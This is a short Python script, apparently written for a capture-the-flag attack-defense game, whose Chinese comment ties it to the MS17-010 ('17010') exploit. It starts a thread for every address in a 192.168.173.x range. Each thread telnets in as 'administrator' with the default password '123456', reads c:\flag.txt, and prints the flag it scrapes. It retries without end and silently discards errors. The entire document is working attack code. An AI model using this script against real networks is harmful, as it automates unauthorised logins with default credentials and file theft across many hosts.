#配合17010-1批量拿flag
import pexpect
import threading
import time
import re

def payload(ip):
    try:
        while True:
            try:
                a=pexpect.spawn('telnet '+ip)
                a.expect("login:")
                a.sendline("administrator\r")
                time.sleep(1)
                a.expect("password:")
                a.sendline("123456\r")
                a.sendline("type c:\\flag.txt\r")
                time.sleep(1)
                a.sendline("exit\r")
                b=a.read()
                flag=re.findall(r"\w{15}",b)
                print(ip,flag[0])
                break
            except:
                pass
    except:
        pass

if __name__ == '__main__':
    for i in range(50,250):
        ip="192.168.173."+str(i)
        max_thread=threading.Thread(group=None,target=payload,args=(ip,))
        max_thread.start()
